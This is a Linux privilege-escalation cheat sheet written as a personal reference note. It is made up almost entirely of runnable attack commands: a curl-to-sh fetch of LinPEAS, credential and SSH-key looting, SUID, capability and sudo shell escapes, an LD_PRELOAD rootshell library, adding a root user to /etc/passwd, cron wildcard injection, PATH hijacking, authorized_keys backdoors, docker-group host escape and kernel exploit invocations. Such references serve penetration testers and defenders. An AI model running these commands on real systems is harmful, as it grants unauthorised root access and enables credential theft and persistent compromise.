---
title: "Linux Privilege Escalation Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - linux
  - privilege-escalation
  - suid
  - capabilities
  - sudo
---

# Linux Privilege Escalation Reference

Reference for Linux local privilege escalation including enumeration, SUID/SGID, capabilities, sudo abuse, cron, and kernel exploits. See also: [[Linux-Persistence-Reference]], [[Network-Pivoting-Reference]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#Enumeration Tools]]
- [[#Manual Enumeration Checklist]]
- [[#Password Looting]]
- [[#SUID / SGID Binaries]]
- [[#Capabilities]]
- [[#Sudo Misconfigurations]]
- [[#Cron Jobs]]
- [[#Systemd Timers]]
- [[#Writable Files and Paths]]
- [[#NFS Misconfigurations]]
- [[#Kernel Exploits]]
- [[#PATH Hijacking]]
- [[#SSH Keys]]
- [[#Docker / LXC Containers]]

---

## Enumeration Tools

```bash
# LinPEAS - comprehensive automated enum
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh
./linpeas.sh -q   # Quiet
./linpeas.sh 2>/dev/null | tee linpeas_output.txt

# LinEnum
./LinEnum.sh -t   # Thorough
./LinEnum.sh -t -r report -e /tmp  # With export

# LES (Linux Exploit Suggester)
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
# Online: paste uname -a output

# pspy (process spy - no root needed)
./pspy64
./pspy32
```

---

## Manual Enumeration Checklist

### System Info

```bash
uname -a          # Kernel version
cat /etc/os-release
cat /etc/issue
hostnamectl
lscpu
```

### User Info

```bash
whoami
id
groups
cat /etc/passwd   # All users
cat /etc/group    # All groups
w                 # Logged in users
last              # Login history
lastlog           # Last login per user
```

### Network

```bash
ip a
ip route
ss -tulnp         # Listening ports
netstat -tulnp
cat /etc/hosts
cat /etc/resolv.conf
iptables -L 2>/dev/null
```

### Processes

```bash
ps aux
ps -ef
ls -la /proc/*/exe 2>/dev/null  # Running binaries
```

### Environment

```bash
env
cat ~/.bashrc
cat ~/.bash_history
cat ~/.zsh_history
history
```

---

## Password Looting

```bash
# Common credential files
cat /etc/passwd
cat /etc/shadow  # Needs root
cat /var/shadow
cat /var/log/auth.log  # May contain cleartext creds

# Web app credentials
find / -name "*.conf" -type f 2>/dev/null | xargs grep -l password 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
cat /var/www/html/config*.php 2>/dev/null

# Database credentials
find / -name "*.sql" 2>/dev/null
find / -name ".my.cnf" 2>/dev/null
cat ~/.pgpass

# SSH private keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Git credentials
find / -name ".git-credentials" 2>/dev/null
cat ~/.git-credentials

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history
```

---

## SUID / SGID Binaries

SUID (Set User ID) binaries run with the owner's permissions. If root owns a SUID binary, it runs as root.

### Finding SUID/SGID

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# With owner info
find / -perm -4000 -user root -type f 2>/dev/null -ls
```

### Creating SUID Shell (if you have write access to /tmp as root)

```bash
# Compile SUID shell binary
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > /tmp/suid.c
gcc /tmp/suid.c -o /tmp/suidshell 2>/dev/null
rm /tmp/suid.c
chown root:root /tmp/suidshell
chmod 4777 /tmp/suidshell

# Execute
/tmp/suidshell
```

### Common SUID Exploits (GTFOBins)

```bash
# Check: https://gtfobins.github.io/

# vim with SUID
vim -c ':!sh'
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# nmap with SUID (older)
nmap --interactive
nmap> !sh

# bash with SUID
bash -p

# find with SUID
find . -exec /bin/sh \; -quit

# python with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl with SUID
perl -e 'exec "/bin/sh";'

# cp with SUID
cp /bin/sh /tmp/sh
chmod 4777 /tmp/sh
```

---

## Capabilities

Linux capabilities divide root privileges into distinct units. Binaries with capabilities can perform specific privileged actions.

### Finding Capabilities

```bash
# Find all binaries with capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities:
# cap_setuid      - Can change UID to root
# cap_net_raw     - Raw sockets (e.g., ping-type attacks)
# cap_dac_override - Bypass file read/write/execute DAC checks
# cap_sys_ptrace  - Can ptrace any process
```

### Exploitation by Capability

```bash
# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# ruby with cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

# node with cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# tar with cap_dac_read_search
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar xf /tmp/shadow.tar.gz -C /tmp/

# gdb with cap_sys_ptrace (inject shellcode into root process)
gdb -p <root_process_pid>
(gdb) call (void)system("id > /tmp/output")
```

---

## Sudo Misconfigurations

### Enumeration

```bash
sudo -l          # List allowed sudo commands
sudo -l -l       # More verbose
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null
```

### Common Misconfigurations

```bash
# NOPASSWD - no password required
# (ALL) ALL - can run anything as any user
# Specific binary with NOPASSWD

# vim/nano/less - spawn shell
sudo vim -c ':!sh'
sudo nano (Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0)
sudo less /etc/passwd
!/bin/sh

# python/perl/ruby
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'

# find
sudo find . -exec /bin/sh \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# cp (copy /etc/passwd or shadow)
sudo cp /etc/shadow /tmp/shadow

# tee (append to privileged files)
echo "newuser:$(openssl passwd -1 pass):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd

# env bypass (LD_PRELOAD if env_keep)
# /etc/sudoers: Defaults env_keep += LD_PRELOAD
cat > /tmp/rootshell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/rootshell.so /tmp/rootshell.c
sudo LD_PRELOAD=/tmp/rootshell.so <any_sudo_allowed_command>

# env_keep with LD_LIBRARY_PATH
ldd $(which <sudo_allowed_binary>)
# Create malicious .so with same name in /tmp
gcc -fPIC -shared -nostartfiles -o /tmp/libc.so.6 rootshell.c
sudo LD_LIBRARY_PATH=/tmp <sudo_allowed_binary>
```

---

## Cron Jobs

```bash
# View cron jobs
crontab -l          # Current user
crontab -l -u root  # Root (if allowed)
cat /etc/crontab
ls -la /etc/cron*
ls -la /var/spool/cron/
cat /etc/cron.d/*
cat /etc/cron.daily/*

# Monitor cron with pspy
./pspy64
./pspy32

# If cron script is writable
echo "chmod u+s /bin/bash" >> /etc/cron.d/cronjob
# Wait for execution
/bin/bash -p
```

### Wildcard Injection in Cron

```bash
# Example: cron runs "tar czf backup.tar.gz /var/backup/*"
# If you can create files in /var/backup:
touch /var/backup/--checkpoint=1
touch /var/backup/--checkpoint-action=exec=sh\ exploit.sh
echo "chmod u+s /bin/bash" > /var/backup/exploit.sh
chmod +x /var/backup/exploit.sh
# Wait for cron execution, then: /bin/bash -p
```

---

## Systemd Timers

```bash
# List timers
systemctl list-timers --all

# Check timer file and service
cat /etc/systemd/system/*.timer
cat /etc/systemd/system/*.service

# If service file is writable, modify the ExecStart
# Then: systemctl daemon-reload && systemctl restart <service>
```

---

## Writable Files and Paths

```bash
# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Files writable by current user
find / -user $(whoami) -writable 2>/dev/null

# Check /etc/passwd is writable (rare but happens)
ls -la /etc/passwd
# If writable: add root user
echo "hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker   # Password: hacked
```

---

## NFS Misconfigurations

```bash
# Check NFS exports
cat /etc/exports
showmount -e <NFS_SERVER_IP>

# no_root_squash - allows root on client to be root on share
# If /etc/exports has: /share *(rw,no_root_squash)
# Mount the share
mount -t nfs <SERVER_IP>:/share /tmp/nfs

# Create SUID bash
cp /bin/bash /tmp/nfs/bash
chmod 4777 /tmp/nfs/bash

# Execute on target
/tmp/bash -p    # Runs as root
```

---

## Kernel Exploits

**Use as last resort - can cause system instability!**

```bash
# Identify kernel version
uname -r
uname -a

# Linux Exploit Suggester
./linux-exploit-suggester.sh
# or paste uname output at: https://github.com/mzet-/linux-exploit-suggester

# Common kernel exploits:
# Dirty COW (CVE-2016-5195) - Linux ≤ 4.8.3
# DirtyPipe (CVE-2022-0847) - Linux 5.8-5.16.11
# PwnKit (CVE-2021-4034) - pkexec
# Sudo Baron Samedit (CVE-2021-3156) - sudo < 1.9.5p2
# OverlayFS (CVE-2023-0386) - Linux < 6.2

# DirtyPipe (CVE-2022-0847)
./dirtypipe-exploit /usr/bin/sudo

# PwnKit (CVE-2021-4034)
./CVE-2021-4034
# Or: python3 -c "import os; os.environ['GCONV_PATH']='.'..."

# sudo Baron Samedit (CVE-2021-3156)
./exploit_nss
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
```

---

## PATH Hijacking

```bash
# Check PATH
echo $PATH
env | grep PATH

# Find SUID/sudo programs that call other programs without full path
strings /usr/local/bin/vuln-binary 2>/dev/null | grep -v "/"
# If it calls "python" or "service" without full path:

# Hijack by prepending writable dir
mkdir /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/python
echo '/bin/bash -i' >> /tmp/hijack/python
chmod +x /tmp/hijack/python
export PATH=/tmp/hijack:$PATH
/usr/local/bin/vuln-binary  # Now uses our python
```

---

## SSH Keys

```bash
# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Check authorized_keys
find / -name "authorized_keys" 2>/dev/null

# If we can write to ~/.ssh/authorized_keys
ssh-keygen -t rsa -f /tmp/attacker_key
cat /tmp/attacker_key.pub >> ~/.ssh/authorized_keys
ssh -i /tmp/attacker_key user@host

# If we have root and can write to /root/.ssh
mkdir -p /root/.ssh
echo "<ATTACKER_PUBLIC_KEY>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

---

## Docker / LXC Containers

```bash
# Check if in container
cat /proc/1/cgroup  # Contains 'docker' if in container
ls /.dockerenv

# Check if user is in docker group
id | grep docker
groups | grep docker

# If in docker group - escape to host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --privileged --rm -it alpine sh
# Inside: mount /dev/sda1 /mnt && chroot /mnt sh

# If docker socket is accessible
ls -la /var/run/docker.sock
# Mount host filesystem via socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```
